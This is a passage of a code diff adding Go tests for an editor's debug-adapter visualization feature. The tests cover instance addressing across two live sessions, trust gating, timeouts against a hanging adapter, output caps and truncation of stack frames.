+	a.consumeDebugRequest()
+	if _, err := state.ChooseDebugInstance(""); err == nil || !strings.Contains(err.Error(), "no herdr-edit") {
+		t.Fatalf("no session: err = %v, want no instance", err)
+	}
+
+	a, _ = vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
+	a.consumeDebugRequest()
+	inst, err := state.ChooseDebugInstance("")
+	if err != nil || inst.ID != a.debugInstanceID() || inst.Root != a.rootDir {
+		t.Fatalf("live session: %+v, %v", inst, err)
+	}
+	a.debug = nil
+	a.consumeDebugRequest()
+	if state.DebugInstanceRegistered(inst.ID) {
+		t.Error("an editor whose session ended is still registered")
+	}
+}
+
+// TestDebugVizSideEffectsRunInExactlyOneSession pins addressing: two editors
+// are debugging, both trusted. Without --instance the CLI refuses and lists
+// both; with it, a side-effecting evaluate reaches ONE adapter, and the other
+// editor — polling the same state directory — never sends it.
+func TestDebugVizSideEffectsRunInExactlyOneSession(t *testing.T) {
+	a, fakeA := vizSessionFixture(t, dap.EvaluateResult{Result: "1"}, nil, 0)
+	stateDir := os.Getenv("XDG_STATE_HOME")
+	b, fakeB := vizSessionFixture(t, dap.EvaluateResult{Result: "2"}, nil, 0)
+	t.Setenv("XDG_STATE_HOME", stateDir) // one state directory, as on one machine
+
+	trustProject(t, a.rootDir, true)
+	tf, err := format.LoadTrust(format.DefaultTrustPath())
+	if err != nil {
+		t.Fatal(err)
+	}
+	writeFormatConfig(t, b.rootDir, vizFormatConfig)
+	cfg, err := format.Load(b.rootDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	tf.SetTrust(b.rootDir, cfg.Hash(), true)
+	if err := format.SaveTrust(format.DefaultTrustPath(), tf); err != nil {
+		t.Fatal(err)
+	}
+	if !a.workspaceTrusted() || !b.workspaceTrusted() {
+		t.Fatal("both editors must be trusted, or B's silence would prove nothing")
+	}
+
+	pollBoth := func() { a.consumeDebugRequest(); b.consumeDebugRequest() }
+	pollBoth()
+	_, err = state.ChooseDebugInstance("")
+	if err == nil || !strings.Contains(err.Error(), "--instance") {
+		t.Fatalf("two sessions without --instance: err = %v, want a refusal", err)
+	}
+	for _, id := range []string{a.debugInstanceID(), b.debugInstanceID()} {
+		if !strings.Contains(err.Error(), id) {
+			t.Errorf("refusal %q does not list instance %s", err, id)
+		}
+	}
+
+	reply := askCLI(t, pollBoth, state.DebugActionEvaluate,
+		"--instance", a.debugInstanceID(), "--expr", "counter++", "--context", "watch", "--allow-side-effects")
+	if !strings.Contains(string(reply), `"value":"1"`) {
+		t.Errorf("reply = %s, want editor A's answer", reply)
+	}
+	pollBoth()
+	time.Sleep(100 * time.Millisecond)
+	if !fakeA.sent("evaluate") {
+		t.Error("the addressed session never evaluated")
+	}
+	if fakeB.sent("evaluate") {
+		t.Error("the side-effecting expression ALSO ran in the session it was not addressed to")
+	}
+}
+
+// TestDebugVizBoundHoldsAgainstAHangingAdapter pins the time bound: an adapter
+// that stops reading entirely — so neither the request nor a cancel can be
+// written — still gets both commands answered, with a timeout error, within
+// the bound.
+func TestDebugVizBoundHoldsAgainstAHangingAdapter(t *testing.T) {
+	ours, theirs := net.Pipe() // nobody ever reads theirs
+	client := dap.StartConn("hung", ours, dap.Handlers{})
+	t.Cleanup(func() { _ = theirs.Close(); _ = ours.Close() })
+	tgt := debugVizTarget{
+		client:  client,
+		caps:    dap.EvalCaps{SupportsEvaluateForHovers: true, SupportsCancelRequest: true},
+		pause:   dap.PauseState{Stopped: true, ThreadID: 1},
+		trusted: true,
+	}
+	lim := dap.DefaultEvalLimits()
+	lim.Timeout = 300 * time.Millisecond
+
+	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
+		start := time.Now()
+		out := runDebugVizBounded(tgt, debugVizRequest{Command: cmd, Expression: "for{}"}, lim)
+		if el := time.Since(start); el > lim.Timeout+200*time.Millisecond {
+			t.Errorf("%s answered after %v, bound %v", cmd, el, lim.Timeout)
+		}
+		assertSchemaValid(t, out, "error")
+		if !strings.Contains(string(out), dap.ErrEvalTimeout.Error()) {
+			t.Errorf("%s: reply = %s, want a timeout", cmd, out)
+		}
+	}
+}
+
+// TestDebugVizFramesAndErrorsFitTheOutputCap pins the serialized cap on the two
+// non-visualization replies: a deep stack keeps its innermost frames and says
+// it was truncated, and an adapter's huge error message is clipped.
+func TestDebugVizFramesAndErrorsFitTheOutputCap(t *testing.T) {
+	stack := make([]dap.StackFrame, 400)
+	for i := range stack {
+		stack[i] = dap.StackFrame{ID: i, Name: "frame<" + strconv.Itoa(i) + ">", Source: dap.Source{Path: "/p/deep.go"}, Line: i + 1}
+	}
+	client, _ := newVizAdapter(t, stack, dap.EvaluateResult{}, nil)
+	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
+	lim := dap.DefaultEvalLimits()
+	lim.MaxOutBytes = 4096
+
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizFrames}, lim)
+	if len(out) > lim.MaxOutBytes {
+		t.Fatalf("frames reply is %d bytes, cap %d", len(out), lim.MaxOutBytes)
+	}
+	assertSchemaValid(t, out, "frames")
+	var doc debugVizFramesDoc
+	if err := json.Unmarshal(out, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if !doc.Truncated || len(doc.Frames) == 0 || len(doc.Frames) >= len(stack) || doc.Frames[0].ID != 0 {
+		t.Errorf("truncated=%v kept %d frames (first %+v), want the innermost prefix", doc.Truncated, len(doc.Frames), doc.Frames)
+	}
+
+	huge := debugVizError(errors.New("adapter says: "+strings.Repeat("<", 10000)), lim.MaxOutBytes)
+	if len(huge) > lim.MaxOutBytes {
+		t.Fatalf("error reply is %d bytes, cap %d", len(huge), lim.MaxOutBytes)
+	}
+	assertSchemaValid(t, huge, "error")
+	if !strings.Contains(string(huge), "adapter says") {
+		t.Errorf("clipped error lost its start: %.80s", huge)
+	}
+}
+
+// With child sessions the leaf owns the stop state, so the coordinator's events must never move the
+// generation a leaf evaluate is pinned to.
+func TestSessionStopGensSeparatesLeafFromCoordinator(t *testing.T) {
+	root, leaf := sessionStopGens(true)
+	if root == leaf {
+		t.Fatal("child sessions share the coordinator's stop generation")
+	}
+	root.Bump()
+	if leaf.Load() != 0 {
+		t.Fatalf("a coordinator bump moved the leaf generation to %d", leaf.Load())
+	}
+	single, eval := sessionStopGens(false)
+	if single != eval {
+		t.Fatal("a single-session adapter must evaluate against its own generation")
+	}
+}
+
+// A coordinator's capabilities event describes a session no evaluate is sent to, so it must not
+// revise the leaf's eval caps; the leaf's own event still does.
+func TestCapabilitiesEventFromCoordinatorDoesNotReviseLeafEvalCaps(t *testing.T) {
+	a, _ := startVizSession(t, map[string]interface{}{"supportsEvaluateForHovers": false}, 0)
+	leaf := a.debug.client
+	coordinator := &dap.Client{}
+	a.debug.root = coordinator // the js-debug coordinator: its events reach the handler, unlike a stranger's
+	body := json.RawMessage(`{"capabilities":{"supportsEvaluateForHovers":true}}`)
+	a.handleDAPEvent(&debugEvent{when: time.Now(), client: coordinator, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
+	if a.debug.evalCaps.SupportsEvaluateForHovers {
+		t.Fatal("a coordinator capabilities event revised the leaf's eval caps")
+	}
+	a.handleDAPEvent(&debugEvent{when: time.Now(), client: leaf, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
+	if !a.debug.evalCaps.SupportsEvaluateForHovers {
+		t.Fatal("the leaf's own capabilities event was ignored")
+	}
+}
+
+// A workspace with no .spiceedit/format.json is untrusted for debug queries, and checking that must
+// not crash (Config.Hash tolerates the nil config Load returns for a missing file).
+func TestWorkspaceTrustedWithoutFormatConfigIsFalse(t *testing.T) {
+	a, _ := debugFixture(t)
+	if a.workspaceTrusted() {
+		t.Fatal("a workspace with no format config read as trusted")
+	}
+}
+
+// Truncation keeps the innermost frames; when the selected frame is cut away, the reply must not
+// still name it.
+func TestFramesTruncationNeverNamesAnAbsentSelectedFrame(t *testing.T) {
+	frames := make([]debugVizFrame, 200)
+	for i := range frames {
+		frames[i] = debugVizFrame{ID: i + 1, Name: strings.Repeat("f", 40), Path: "/src/x.go", Line: i + 1}
+	}
+	outer := 200
+	out := debugVizFitFrames(debugVizFramesDoc{SchemaVersion: dap.VizSchemaVersion, Frames: frames, SelectedFrameID: &outer}, 2048)
+	var doc debugVizFramesDoc
+	if err := json.Unmarshal(out, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if !doc.Truncated || len(doc.Frames) == 0 || len(doc.Frames) == len(frames) {
+		t.Fatalf("want a truncated, non-empty prefix; got %d frames truncated=%v", len(doc.Frames), doc.Truncated)
+	}
+	if doc.SelectedFrameID != nil {
+		t.Fatalf("selectedFrameId %d is not among the %d kept frames", *doc.SelectedFrameID, len(doc.Frames))
+	}
+	inner := 1
+	out = debugVizFitFrames(debugVizFramesDoc{SchemaVersion: dap.VizSchemaVersion, Frames: frames, SelectedFrameID: &inner}, 2048)
+	_ = json.Unmarshal(out, &doc)
+	if doc.SelectedFrameID == nil || *doc.SelectedFrameID != 1 {
+		t.Fatal("a kept selected frame lost its selectedFrameId")
+	}
+}
+
+// The reader advances the stop generation the moment a continued/stopped event arrives; the pause
+// state changes only when the main loop applies it. A query snapshotted in between must refuse,
+// not pin the new generation to the old stop's state.
+func TestDebugVizRefusesWhileAStopEventIsPending(t *testing.T) {
+	a, _ := startVizSession(t, map[string]interface{}{"supportsEvaluateForHovers": true}, 0)
+	tgt, err := a.debugVizTarget()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "x"}, dap.DefaultEvalLimits()); strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
+		t.Fatalf("a settled stop refused: %s", out)
+	}
+	a.debug.gen().Observe(dap.Event{Event: dap.EventContinued}) // observed by the reader, not yet applied
+	tgt, err = a.debugVizTarget()
+	if err != nil {
+		t.Fatal(err)
+	}
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "x"}, dap.DefaultEvalLimits())
+	if !strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
+		t.Fatalf("evaluate ran against a stop whose continued event was still pending: %s", out)
 	}
 }
